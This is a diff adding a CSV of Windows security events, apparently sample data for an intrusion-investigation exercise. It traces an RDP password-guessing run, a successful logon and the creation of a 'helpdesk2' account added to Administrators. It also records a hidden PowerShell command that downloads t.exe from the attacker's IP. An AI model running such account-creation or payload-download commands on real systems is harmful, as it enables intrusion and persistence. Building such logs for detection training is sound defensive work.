@@ -1,0 +1,21 @@
+time,host,event_id,description,account,source_ip,logon_type,process
+2026-11-04 02:00:02,DC-01,4625,An account failed to log on,administrator,198.51.100.150,10,
+2026-11-04 02:00:04,DC-01,4625,An account failed to log on,administrator,198.51.100.150,10,
+2026-11-04 02:00:06,DC-01,4625,An account failed to log on,admin,198.51.100.150,10,
+2026-11-04 02:00:08,DC-01,4625,An account failed to log on,admin,198.51.100.150,10,
+2026-11-04 02:00:10,DC-01,4625,An account failed to log on,vendor,198.51.100.150,10,
+2026-11-04 02:00:12,DC-01,4625,An account failed to log on,vendor,198.51.100.150,10,
+2026-11-04 02:00:14,DC-01,4625,An account failed to log on,vendor,198.51.100.150,10,
+2026-11-04 02:00:16,DC-01,4625,An account failed to log on,vendor,198.51.100.150,10,
+2026-11-04 02:00:18,DC-01,4625,An account failed to log on,vendor,198.51.100.150,10,
+2026-11-04 02:00:20,DC-01,4625,An account failed to log on,vendor,198.51.100.150,10,
+2026-11-04 02:00:22,DC-01,4625,An account failed to log on,vendor,198.51.100.150,10,
+2026-11-04 02:00:24,DC-01,4625,An account failed to log on,vendor,198.51.100.150,10,
+2026-11-04 02:03:41,DC-01,4624,An account was successfully logged on,vendor,198.51.100.150,10,
+2026-11-04 02:05:30,DC-01,4688,A new process has been created,vendor,,,C:\Windows\System32\cmd.exe
+2026-11-04 02:05:44,DC-01,4688,A new process has been created,vendor,,,C:\Windows\System32\whoami.exe
+2026-11-04 02:06:10,DC-01,4688,A new process has been created,vendor,,,C:\Windows\System32\net.exe (net user helpdesk2 /add)
+2026-11-04 02:06:11,DC-01,4720,A user account was created,helpdesk2,,,
+2026-11-04 02:06:25,DC-01,4732,A member was added to a security-enabled local group (Administrators),helpdesk2,,,
+2026-11-04 02:11:29,DC-01,4688,A new process has been created,vendor,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c iwr hxxp://198.51.100.150/t.exe
+2026-11-04 08:00:15,DC-01,4624,An account was successfully logged on,jsantos,10.10.20.15,2,
